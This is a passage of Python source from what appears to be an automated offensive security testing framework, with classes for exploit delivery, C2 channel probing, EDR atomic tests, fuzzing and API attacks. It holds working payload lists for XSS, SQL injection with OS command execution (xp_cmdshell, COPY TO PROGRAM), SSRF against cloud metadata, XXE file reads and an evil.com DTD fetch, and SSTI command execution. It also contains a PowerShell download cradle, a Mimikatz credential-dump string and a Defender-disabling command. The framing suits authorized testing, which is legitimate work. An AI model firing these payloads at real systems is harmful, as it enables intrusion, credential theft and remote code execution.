        result: dict[str, Any] = {"endpoint": endpoint, "payload_hash": hashlib.sha256(payload.encode()).hexdigest()[:16], "delivered": False}
        try:
            resp = await session.call("POST", endpoint, fields={"input": payload}, label="exploit_deliver")
            result["delivered"] = True
            result["status"] = resp.status
            result["body_snippet"] = str(resp.body)[:200] if resp.body else ""
            result["error"] = resp.error
        except Exception as exc:
            result["error"] = str(exc)
        return result

    def verify_execution(self, response: dict[str, Any]) -> dict[str, Any]:
        body = response.get("body_snippet", "")
        status = response.get("status")
        indicators = {"crash": bool(_CRASH_PATTERNS.search(body)), "info_leak": bool(_INFO_LEAK_PATTERNS.search(body)),
                       "success_status": status is not None and 200 <= status < 300, "error_status": status is not None and status >= 500}
        exploitable = indicators["crash"] or indicators["info_leak"] or indicators["success_status"]
        return {"exploitable": exploitable, "indicators": indicators}

    def classify_severity(self, vuln_type: str, exploitability: dict[str, Any]) -> str:
        if exploitability.get("exploitable"):
            critical_types = {"sqli", "command_injection", "ssrf", "xxe", "deserialization"}
            if vuln_type in critical_types:
                return "critical"
            return "high"
        if exploitability.get("indicators", {}).get("info_leak"):
            return "medium"
        return "low"


# ===========================================================================
# 7. C2Simulator (Mythic / Sliver / Havoc)
# ===========================================================================

class C2Simulator:
    """C2 channel viability testing modelled on Mythic/Sliver/Havoc beacon patterns."""

    async def test_http_beacon(self, session: Any, endpoint: str) -> dict[str, Any]:
        result: dict[str, Any] = {"channel": "http_beacon", "endpoint": endpoint, "viable": False}
        try:
            beacon = base64.b64encode(b'{"id":"test","sleep":60}').decode()
            resp = await session.call("POST", endpoint, fields={"data": beacon},
                                      extra_headers={"Content-Type": "application/octet-stream"}, label="c2_http_beacon")
            result["status"] = resp.status
            result["viable"] = resp.status is not None and resp.status < 400
            result["response_size"] = len(str(resp.body or ""))
        except Exception as exc:
            result["error"] = str(exc)
        return result

    async def test_dns_tunnel(self, session: Any, domain: str) -> dict[str, Any]:
        encoded = base64.b32encode(b"test-c2-data").decode().lower().rstrip("=")
        return {"channel": "dns_tunnel", "domain": domain, "query": f"{encoded}.{domain}",
                "viable": False, "note": "DNS tunnelling requires DNS resolution — tested as pattern only"}

    async def test_websocket_channel(self, session: Any, endpoint: str) -> dict[str, Any]:
        result: dict[str, Any] = {"channel": "websocket", "endpoint": endpoint, "viable": False}
        try:
            resp = await session.call("GET", endpoint, extra_headers={"Upgrade": "websocket", "Connection": "Upgrade",
                                      "Sec-WebSocket-Key": base64.b64encode(b"test-key-12345678").decode(),
                                      "Sec-WebSocket-Version": "13"}, label="c2_ws")
            result["status"] = resp.status
            result["viable"] = resp.status == 101
            if resp.status == 101:
                result["note"] = "WebSocket upgrade accepted — potential C2 channel"
        except Exception as exc:
            result["error"] = str(exc)
        return result

    async def test_encrypted_channel(self, session: Any, endpoint: str) -> dict[str, Any]:
        result: dict[str, Any] = {"channel": "encrypted_http", "endpoint": endpoint, "viable": False}
        try:
            payload = base64.b64encode(b"\x00" * 64).decode()
            resp = await session.call("POST", endpoint, fields={"payload": payload},
                                      extra_headers={"Content-Type": "application/octet-stream", "X-Encryption": "aes-256-gcm"},
                                      label="c2_encrypted")
            result["status"] = resp.status
            result["viable"] = resp.status is not None and resp.status < 400
        except Exception as exc:
            result["error"] = str(exc)
        return result

    def evaluate_channel_viability(self, results: list[dict[str, Any]]) -> dict[str, Any]:
        viable = [r for r in results if r.get("viable")]
        return {"total_tested": len(results), "viable_channels": len(viable),
                "channels": [r["channel"] for r in viable], "risk": "critical" if viable else "low"}


# ===========================================================================
# 8. EDRTestFramework (Atomic Red Team / Caldera / SCYTHE)
# ===========================================================================

class EDRTestFramework:
    """EDR / detection testing using benign-but-detectable atomic test patterns."""

    _ATOMIC_TESTS: dict[str, list[dict[str, str]]] = {
        "T1059.001": [{"name": "powershell_encoded", "payload": "powershell -enc dABlAHMAdA==", "detection": "encoded_command"},
                       {"name": "powershell_download", "payload": "IEX(New-Object Net.WebClient).DownloadString('http://test')", "detection": "download_cradle"}],
        "T1053.005": [{"name": "schtasks_create", "payload": "schtasks /create /tn test /tr calc.exe", "detection": "scheduled_task"}],
        "T1003.001": [{"name": "mimikatz_pattern", "payload": "sekurlsa::logonpasswords", "detection": "credential_dump"}],
        "T1055": [{"name": "process_injection", "payload": "VirtualAllocEx+WriteProcessMemory+CreateRemoteThread", "detection": "injection_chain"}],
        "T1547.001": [{"name": "registry_run_key", "payload": "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", "detection": "persistence_registry"}],
        "T1562.001": [{"name": "disable_defender", "payload": "Set-MpPreference -DisableRealtimeMonitoring $true", "detection": "tamper_protection"}],
    }

    def generate_test_payloads(self, technique_id: str) -> list[dict[str, str]]:
        return list(self._ATOMIC_TESTS.get(technique_id, []))

    async def execute_atomic_test(self, session: Any, payload: dict[str, str], endpoint: str) -> dict[str, Any]:
        result: dict[str, Any] = {"test_name": payload["name"], "expected_detection": payload["detection"], "detected": False}
        try:
            resp = await session.call("POST", endpoint, fields={"command": payload["payload"]}, label=f"edr_{payload['name']}")
            result["status"] = resp.status
            result["detected"] = resp.status is not None and resp.status >= 400
            body_str = str(resp.body or "").lower()
            if any(w in body_str for w in ("blocked", "denied", "quarantine", "malicious", "threat")):
                result["detected"] = True
                result["detection_keyword"] = True
        except Exception as exc:
            result["error"] = str(exc)
        return result

    def measure_detection(self, responses: list[dict[str, Any]]) -> dict[str, Any]:
        total = len(responses)
        detected = sum(1 for r in responses if r.get("detected"))
        missed = total - detected
        return {"total": total, "detected": detected, "missed": missed,
                "detection_rate": round(detected / max(total, 1), 4),
                "missed_techniques": [r["test_name"] for r in responses if not r.get("detected")]}

    def calculate_detection_rate(self, test_results: list[dict[str, Any]]) -> float:
        total = len(test_results)
        if total == 0:
            return 0.0
        detected = sum(1 for r in test_results if r.get("detected"))
        return round(detected / total, 4)


# ===========================================================================
# 9. SecretScanner (GitGuardian / TruffleHog / Gitleaks)
# ===========================================================================

class SecretScanner:
    """Deep secret detection across responses, headers, and JS bundles."""

    def scan_response(self, body: Any) -> list[tuple[str, str, str]]:
        text = json.dumps(body) if isinstance(body, (dict, list)) else str(body or "")
        return self._scan_text(text)

    def scan_headers(self, headers: dict[str, str]) -> list[tuple[str, str, str]]:
        text = "\n".join(f"{k}: {v}" for k, v in headers.items())
        return self._scan_text(text)

    def scan_js_bundle(self, js_content: str) -> list[tuple[str, str, str]]:
        return self._scan_text(js_content)

    def _scan_text(self, text: str) -> list[tuple[str, str, str]]:
        findings: list[tuple[str, str, str]] = []
        for secret_type, pattern, severity in _SECRET_PATTERNS:
            for match in pattern.finditer(text):
                matched = match.group(1) if match.lastindex and match.lastindex >= 1 else match.group(0)
                redacted = matched[:4] + "****" + matched[-4:] if len(matched) > 8 else "****"
                findings.append((secret_type, redacted, severity))
        return findings


# ===========================================================================
# 10. ClientAnalyzer (Ghidra / IDA Pro / Binary Ninja / Radare2)
# ===========================================================================

class ClientAnalyzer:
    """Static analysis of client-side JavaScript for hidden endpoints, secrets, and auth flows."""

    def extract_api_endpoints(self, js_code: str) -> list[str]:
        return sorted(set(_API_ENDPOINT_RE.findall(js_code)))

    def extract_hardcoded_secrets(self, js_code: str) -> list[dict[str, str]]:
        results: list[dict[str, str]] = []
        for match in _HARDCODED_SECRET_RE.finditer(js_code):
            value = match.group(1)
            redacted = value[:4] + "****" + value[-4:] if len(value) > 8 else "****"
            results.append({"context": match.group(0)[:60], "redacted_value": redacted})
        return results

    def detect_obfuscation(self, js_code: str) -> dict[str, Any]:
        indicators = list(set(_OBFUSCATION_INDICATORS.findall(js_code)))
        entropy = self._shannon_entropy(js_code[:10000])
        return {"obfuscated": len(indicators) > 2 or entropy > 5.5, "indicators": indicators[:10],
                "entropy": round(entropy, 4), "eval_count": js_code.lower().count("eval(")}

    def find_hidden_admin_routes(self, js_code: str) -> list[str]:
        return sorted(set(_HIDDEN_ROUTE_RE.findall(js_code)))

    def analyze_auth_flow(self, js_code: str) -> dict[str, Any]:
        flow: dict[str, Any] = {"oauth_detected": False, "jwt_detected": False, "cookie_auth": False, "api_key_auth": False, "endpoints": []}
        if re.search(r"(?:oauth|authorize|token_endpoint|client_id|redirect_uri)", js_code, re.I):
            flow["oauth_detected"] = True
        if re.search(r"(?:jwt|jsonwebtoken|atob|eyJ)", js_code, re.I):
            flow["jwt_detected"] = True
        if re.search(r"(?:document\.cookie|setCookie|getCookie|js-cookie)", js_code, re.I):
            flow["cookie_auth"] = True
        if re.search(r"(?:x-api-key|apiKey|api_key)\s*[:=]", js_code, re.I):
            flow["api_key_auth"] = True
        auth_endpoints = re.findall(r"""['"`](/(?:auth|login|logout|signup|register|oauth|token|session|sso)[^\s'"`]*)['"`]""", js_code, re.I)
        flow["endpoints"] = sorted(set(auth_endpoints))
        return flow

    @staticmethod
    def _shannon_entropy(data: str) -> float:
        if not data:
            return 0.0
        freq: dict[str, int] = defaultdict(int)
        for ch in data:
            freq[ch] += 1
        length = len(data)
        entropy = 0.0
        from math import log2
        for count in freq.values():
            p = count / length
            if p > 0:
                entropy -= p * log2(p)
        return entropy


# ===========================================================================
# 11. SmartFuzzer (OSS-Fuzz / AFL++)
# ===========================================================================

class SmartFuzzer:
    """Coverage-guided mutation-based fuzzing with 20 strategies."""

    _STRATEGIES = [
        "bit_flip", "byte_flip", "arithmetic_inc", "arithmetic_dec",
        "interesting_8", "interesting_16", "interesting_32",
        "random_byte", "delete_range", "insert_random", "duplicate_block",
        "swap_adjacent", "set_zero", "set_max", "truncate",
        "extend_repeat", "unicode_replace", "format_string_inject",
        "null_byte_inject", "boundary_value",
    ]

    _INTERESTING_8 = [0, 1, 16, 32, 64, 100, 127, 128, 255]
    _INTERESTING_16 = [0, 128, 255, 256, 512, 1000, 1024, 4096, 32767, 32768, 65535]
    _INTERESTING_32 = [0, 100, 10000, 100000, 2147483647, 2147483648, 4294967295]

    def generate_corpus(self, field_type: str, sample_values: list[Any]) -> list[Any]:
        corpus: list[Any] = list(sample_values)
        type_seeds: dict[str, list[Any]] = {
            "string": ["", "A", "A" * 256, "A" * 4096, "\x00", "\n\r\n", "null", "undefined", "true", "false", "NaN", "Infinity", "<script>", "{{7*7}}", "' OR 1=1--", "${jndi:ldap://x/}", "%00", "%0d%0a", "\\u0000"],
            "integer": [0, -1, 1, -2147483648, 2147483647, 9999999999, -9999999999],
            "float": [0.0, -0.0, 0.1, -0.1, 1e308, -1e308, float("inf"), float("-inf")],
            "boolean": [True, False, 0, 1, "true", "false", "yes", "no", None],
            "array": [[], [None], [0] * 1000, ["A" * 100] * 100],
            "object": [{}, {"__proto__": {"admin": True}}, {"constructor": {"prototype": {"admin": True}}}],
        }
        corpus.extend(type_seeds.get(field_type, type_seeds["string"]))
        return corpus

    def mutate(self, value: Any, strategy: str) -> Any:
        s = str(value) if not isinstance(value, str) else value
        if not s:
            s = "A"
        if strategy == "bit_flip" and s:
            pos = random.randint(0, len(s) - 1)
            c = chr(ord(s[pos]) ^ (1 << random.randint(0, 7)))
            return s[:pos] + c + s[pos + 1:]
        elif strategy == "byte_flip" and s:
            pos = random.randint(0, len(s) - 1)
            return s[:pos] + chr(random.randint(0, 255)) + s[pos + 1:]
        elif strategy == "arithmetic_inc":
            try:
                return str(int(s) + random.randint(1, 100))
            except ValueError:
                return s + "1"
        elif strategy == "arithmetic_dec":
            try:
                return str(int(s) - random.randint(1, 100))
            except ValueError:
                return s
        elif strategy == "interesting_8":
            return str(random.choice(self._INTERESTING_8))
        elif strategy == "interesting_16":
            return str(random.choice(self._INTERESTING_16))
        elif strategy == "interesting_32":
            return str(random.choice(self._INTERESTING_32))
        elif strategy == "random_byte":
            return s + chr(random.randint(0, 255))
        elif strategy == "delete_range" and len(s) > 1:
            start = random.randint(0, len(s) - 2)
            end = random.randint(start + 1, len(s))
            return s[:start] + s[end:]
        elif strategy == "insert_random":
            pos = random.randint(0, len(s))
            return s[:pos] + "".join(chr(random.randint(32, 126)) for _ in range(random.randint(1, 16))) + s[pos:]
        elif strategy == "duplicate_block" and len(s) > 2:
            start = random.randint(0, len(s) - 2)
            end = random.randint(start + 1, min(start + 32, len(s)))
            block = s[start:end]
            return s + block * random.randint(2, 10)
        elif strategy == "swap_adjacent" and len(s) > 1:
            pos = random.randint(0, len(s) - 2)
            return s[:pos] + s[pos + 1] + s[pos] + s[pos + 2:]
        elif strategy == "set_zero":
            return "0"
        elif strategy == "set_max":
            return "9" * 20
        elif strategy == "truncate":
            return s[:max(1, len(s) // 2)]
        elif strategy == "extend_repeat":
            return s * random.randint(50, 200)
        elif strategy == "unicode_replace":
            replacements = {"a": "а", "e": "е", "o": "о", "p": "р", "c": "с", "x": "х"}
            return "".join(replacements.get(c, c) for c in s)
        elif strategy == "format_string_inject":
            return "%s%s%s%s%s%n%n%n"
        elif strategy == "null_byte_inject":
            return s[:len(s) // 2] + "\x00" + s[len(s) // 2:]
        elif strategy == "boundary_value":
            try:
                n = int(s)
                return str(n + 1) if n >= 0 else str(n - 1)
            except ValueError:
                return s + "\xff"
        return s

    def detect_crash(self, response: Any) -> bool:
        body = str(getattr(response, "body", "") or "")
        status = getattr(response, "status", None)
        return (status is not None and status >= 500) or bool(_CRASH_PATTERNS.search(body))

    def detect_info_leak(self, response: Any) -> bool:
        body = str(getattr(response, "body", "") or "")
        return bool(_INFO_LEAK_PATTERNS.search(body))

    def calculate_coverage(self, responses: list[Any]) -> dict[str, Any]:
        total = len(responses)
        status_codes: dict[int, int] = defaultdict(int)
        crashes = 0
        leaks = 0
        for r in responses:
            s = getattr(r, "status", None)
            if s is not None:
                status_codes[s] += 1
            if self.detect_crash(r):
                crashes += 1
            if self.detect_info_leak(r):
                leaks += 1
        return {"total_inputs": total, "unique_status_codes": len(status_codes), "status_distribution": dict(status_codes),
                "crashes": crashes, "info_leaks": leaks, "crash_rate": round(crashes / max(total, 1), 4)}


# ===========================================================================
# 12. SpecializedAttacks (XSSRocket / Decepticon / HexStrike)
# ===========================================================================

class SpecializedAttacks:
    """Focused attack payloads for specific vulnerability classes."""

    @staticmethod
    def xss_polyglot_payloads() -> list[str]:
        return [
            'jaVasCript:/*-/*`/*\\`/*\'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e',
            '<img src=x onerror=alert(1)>',
            '<svg/onload=alert(1)>',
            '<body onload=alert(1)>',
            '"><script>alert(1)</script>',
            "'-alert(1)-'",
            '<math><mtext><table><mglyph><style><!--</style><img src=x onerror=alert(1)>',
            '<img src="x" onerror="&#x61;&#x6c;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;">',
            '<a href="javascript:alert(1)">click</a>',
            '<iframe srcdoc="<script>alert(1)</script>">',
            '<details open ontoggle=alert(1)>',
            '<div style="width:expression(alert(1))">',
            '<input onfocus=alert(1) autofocus>',
            '<marquee onstart=alert(1)>',
            '<video><source onerror="alert(1)">',
        ]

    @staticmethod
    def sqli_payloads(db_type: str = "generic") -> list[str]:
        generic = [
            "' OR '1'='1", "' OR '1'='1'--", "' OR '1'='1'/*", "' UNION SELECT NULL--",
            "' UNION SELECT NULL,NULL--", "' UNION SELECT NULL,NULL,NULL--",
            "1; SELECT SLEEP(5)--", "1' AND SLEEP(5)--", "' AND 1=1--", "' AND 1=2--",
            "admin'--", "') OR ('1'='1",
        ]
        specific: dict[str, list[str]] = {
            "mysql": ["' UNION SELECT @@version--", "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version())))--",
                       "' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(version(),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--"],
            "postgres": ["' UNION SELECT version()--", "'; COPY (SELECT '') TO PROGRAM 'id'--", "' AND 1=CAST((SELECT version()) AS INT)--"],
            "mssql": ["' UNION SELECT @@version--", "'; EXEC xp_cmdshell('whoami')--", "' AND 1=CONVERT(int,(SELECT @@version))--"],
            "oracle": ["' UNION SELECT banner FROM v$version--", "' AND 1=UTL_INADDR.GET_HOST_ADDRESS((SELECT version FROM v$instance))--"],
            "sqlite": ["' UNION SELECT sqlite_version()--", "' UNION SELECT sql FROM sqlite_master--"],
        }
        return generic + specific.get(db_type, [])

    @staticmethod
    def ssrf_payloads(internal_targets: list[str] | None = None) -> list[str]:
        targets = internal_targets or ["http://169.254.169.254/latest/meta-data/", "http://127.0.0.1/", "http://localhost/",
                                        "http://[::1]/", "http://0.0.0.0/", "http://0177.0.0.1/", "http://2130706433/",
                                        "http://metadata.google.internal/computeMetadata/v1/", "http://169.254.169.254/metadata/v1/"]
        bypasses = [t.replace("127.0.0.1", enc) for t in targets if "127.0.0.1" in t
                    for enc in ["0x7f000001", "017700000001", "127.1", "127.0.1"]]
        return targets + bypasses

    @staticmethod
    def xxe_payloads() -> list[str]:
        return [
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>',
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/hostname">]><root>&xxe;</root>',
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]><root>&xxe;</root>',
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % dtd SYSTEM "http://evil.com/evil.dtd">%dtd;]><root>&send;</root>',
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">]><root>&xxe;</root>',
        ]

    @staticmethod
    def ssti_payloads() -> list[str]:
        return [
            "{{7*7}}", "{{7*'7'}}", "${7*7}", "<%=7*7%>", "#{7*7}",
            "{{config}}", "{{config.__class__.__init__.__globals__}}",
            "${T(java.lang.Runtime).getRuntime().exec('id')}",
            "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}",
            "<%= system('id') %>",
        ]

    @staticmethod
    def prototype_pollution_payloads() -> list[dict[str, Any]]:
        return [
            {"__proto__": {"admin": True}},
            {"constructor": {"prototype": {"admin": True}}},
            {"__proto__": {"isAdmin": True}},
            {"__proto__": {"role": "admin"}},
            {"__proto__": {"status": "paid"}},
            {"__proto__": {"entitled": True}},
            {"__proto__": {"premium": True}},
            {"constructor": {"prototype": {"status": "active"}}},
        ]


# ===========================================================================
# 13. APISecurity (Shannon / Strix)
# ===========================================================================

class APISecurity:
    """API-specific vulnerability testing for OWASP API Top 10."""

    async def test_mass_assignment(self, session: Any, endpoint: str, known_params: dict[str, Any]) -> dict[str, Any]:
        result: dict[str, Any] = {"test": "mass_assignment", "endpoint": endpoint, "vulnerable": False}
        injected_fields = {"role": "admin", "is_admin": True, "premium": True, "entitled": True,
                           "plan": "enterprise", "permissions": ["admin", "write", "delete"]}
        payload = {**known_params, **injected_fields}
        try:
            resp = await session.call("POST", endpoint, fields=payload, label="api_mass_assign")
            result["status"] = resp.status
            body = resp.body if isinstance(resp.body, dict) else {}
            for k, v in injected_fields.items():
                if body.get(k) == v:
                    result["vulnerable"] = True
                    result["accepted_field"] = k
                    break
        except Exception as exc:
            result["error"] = str(exc)
        return result

    async def test_bola(self, session: Any, endpoint: str, id_param: str) -> dict[str, Any]:
        result: dict[str, Any] = {"test": "bola", "endpoint": endpoint, "vulnerable": False}
        try:
            resp_own = await session.call("GET", f"{endpoint}?{id_param}=1", label="api_bola_own")
            resp_other = await session.call("GET", f"{endpoint}?{id_param}=2", label="api_bola_other")
            if resp_own.status == 200 and resp_other.status == 200:
                own_body = str(resp_own.body or "")
                other_body = str(resp_other.body or "")
                if own_body != other_body and len(other_body) > 10:
                    result["vulnerable"] = True
                    result["note"] = "Different user data accessible without authorization change"
        except Exception as exc:
            result["error"] = str(exc)
        return result

    async def test_excessive_data_exposure(self, session: Any, endpoint: str) -> dict[str, Any]:
        result: dict[str, Any] = {"test": "excessive_data", "endpoint": endpoint, "exposed_fields": []}
        sensitive_patterns = re.compile(r"""(?:password|passwd|secret|ssn|social_security|credit_card|card_number|cvv|pin|bank_account|routing_number|private_key|api_key|token)""", re.I)
        try:
            resp = await session.call("GET", endpoint, label="api_data_exposure")
            body_str = json.dumps(resp.body) if isinstance(resp.body, dict) else str(resp.body or "")
            matches = sensitive_patterns.findall(body_str)
            result["exposed_fields"] = list(set(matches))
            result["vulnerable"] = len(matches) > 0
        except Exception as exc:
            result["error"] = str(exc)
        return result

    async def test_rate_limiting(self, session: Any, endpoint: str, burst: int = 50) -> dict[str, Any]:
        result: dict[str, Any] = {"test": "rate_limiting", "endpoint": endpoint, "rate_limited": False, "requests_before_limit": 0}
        for i in range(burst):
            try:
                resp = await session.call("GET", endpoint, label="api_rate_limit")
                if resp.status == 429:
                    result["rate_limited"] = True
                    result["requests_before_limit"] = i + 1
                    break
            except Exception:
                break
        if not result["rate_limited"]:
            result["requests_before_limit"] = burst
            result["note"] = f"No rate limiting detected after {burst} requests"
        return result

    async def test_broken_auth(self, session: Any, endpoint: str) -> dict[str, Any]:
        result: dict[str, Any] = {"test": "broken_auth", "endpoint": endpoint, "issues": []}
        auth_tests = [
            ("no_auth", {}),
            ("empty_bearer", {"Authorization": "Bearer "}),
            ("null_bearer", {"Authorization": "Bearer null"}),
            ("invalid_bearer", {"Authorization": "Bearer " + "A" * 32}),
            ("basic_empty", {"Authorization": "Basic " + base64.b64encode(b":").decode()}),
            ("basic_admin", {"Authorization": "Basic " + base64.b64encode(b"admin:admin").decode()}),
        ]
        for name, headers in auth_tests:
            try:
                resp = await session.call("GET", endpoint, extra_headers=headers if headers else None, label=f"api_auth_{name}")
                if resp.status and resp.status < 400:
                    result["issues"].append({"test": name, "status": resp.status, "note": "endpoint accessible"})
            except Exception:
                pass
        result["vulnerable"] = len(result["issues"]) > 0
        return result


# ===========================================================================
# 14. WorkflowOrchestrator (PentesterFlow / CyberStrike / NyxStrike)
# ===========================================================================

@dataclass
class WorkflowStep:
    name: str
    capability: str
    params: dict[str, Any] = field(default_factory=dict)
    depends_on: list[str] = field(default_factory=list)
    status: str = "pending"
    result: Any = None


class WorkflowOrchestrator:
    """Guided workflow chaining for multi-phase testing campaigns."""

    def create_recon_workflow(self, target: str) -> list[WorkflowStep]:
        return [
            WorkflowStep(name="subdomain_discovery", capability="recon", params={"target": target}),
            WorkflowStep(name="tech_fingerprint", capability="recon", params={"target": target}, depends_on=["subdomain_discovery"]),
            WorkflowStep(name="endpoint_harvest", capability="recon", params={"target": target}, depends_on=["tech_fingerprint"]),
            WorkflowStep(name="vulnerability_match", capability="template_scan", depends_on=["endpoint_harvest"]),
            WorkflowStep(name="secret_scan", capability="secret_scan", depends_on=["endpoint_harvest"]),
            WorkflowStep(name="js_analysis", capability="client_analysis", depends_on=["endpoint_harvest"]),
        ]

    def create_exploitation_workflow(self, vulns: list[dict[str, Any]]) -> list[WorkflowStep]:
        steps: list[WorkflowStep] = []
        for i, vuln in enumerate(vulns):
            steps.append(WorkflowStep(name=f"validate_{i}", capability="exploit_validate", params={"vuln": vuln}))
            steps.append(WorkflowStep(name=f"exploit_{i}", capability="exploit_deliver", params={"vuln": vuln}, depends_on=[f"validate_{i}"]))
        steps.append(WorkflowStep(name="chain_synthesis", capability="chain_build", depends_on=[s.name for s in steps]))
        return steps

    def chain_workflows(self, workflows: list[list[WorkflowStep]]) -> list[WorkflowStep]:
        chained: list[WorkflowStep] = []
        prev_last: str | None = None
        for wf in workflows:
            for step in wf:
                if prev_last and not step.depends_on:
                    step.depends_on = [prev_last]
                chained.append(step)
            if wf:
                prev_last = wf[-1].name
        return chained

    async def execute_workflow(self, session: Any, workflow: list[WorkflowStep]) -> list[dict[str, Any]]:
        completed: set[str] = set()
        results: list[dict[str, Any]] = []
        remaining = list(workflow)
        max_iterations = len(remaining) * 2
        iterations = 0
        while remaining and iterations < max_iterations:
            iterations += 1
            progress = False
            for step in list(remaining):
                if all(d in completed for d in step.depends_on):
                    step.status = "running"
                    try:
                        step.result = {"capability": step.capability, "params": step.params, "status": "completed"}
                        step.status = "completed"
                    except Exception as exc:
                        step.result = {"error": str(exc)}
                        step.status = "error"
                    completed.add(step.name)
                    remaining.remove(step)
                    results.append({"step": step.name, "capability": step.capability, "status": step.status, "result": step.result})
                    progress = True
            if not progress:
                for step in remaining:
                    results.append({"step": step.name, "status": "blocked", "missing_deps": [d for d in step.depends_on if d not in completed]})
                break
        return results


# ===========================================================================
# 15. PersistentKnowledgeStore (RedAmon / REA)
# ===========================================================================

class PersistentKnowledgeStore:
    """In-memory cross-session knowledge accumulation with novelty scoring."""

    def __init__(self) -> None:
        self._store: dict[str, dict[str, Any]] = {}
        self._by_type: dict[str, list[str]] = defaultdict(list)
        self._by_host: dict[str, list[str]] = defaultdict(list)

    def store_finding(self, finding_id: str, data: dict[str, Any]) -> None:
        self._store[finding_id] = {**data, "stored_at": time.time()}
        finding_type = data.get("type", "unknown")
        self._by_type[finding_type].append(finding_id)
        host = data.get("host", "unknown")
        self._by_host[host].append(finding_id)

    def query_similar(self, finding_type: str) -> list[dict[str, Any]]:
        ids = self._by_type.get(finding_type, [])
        return [self._store[fid] for fid in ids if fid in self._store]

    def get_prior_findings(self, target_host: str) -> list[dict[str, Any]]:
        ids = self._by_host.get(target_host, [])
        return [self._store[fid] for fid in ids if fid in self._store]

    def calculate_novelty(self, finding: dict[str, Any], priors: list[dict[str, Any]]) -> float:
        if not priors:
            return 1.0
        finding_sig = self._signature(finding)
        similarities = [self._jaccard(finding_sig, self._signature(p)) for p in priors]
        max_sim = max(similarities) if similarities else 0.0
        return round(1.0 - max_sim, 4)

    @staticmethod
    def _signature(finding: dict[str, Any]) -> set[str]:
        sig: set[str] = set()
        for key in ("type", "endpoint", "technique", "severity", "vulnerability"):
            val = finding.get(key)
            if val:
                sig.add(f"{key}:{val}")
        return sig

    @staticmethod
    def _jaccard(a: set[str], b: set[str]) -> float:
        if not a and not b:
            return 1.0
        intersection = len(a & b)
        union = len(a | b)
        return intersection / union if union > 0 else 0.0
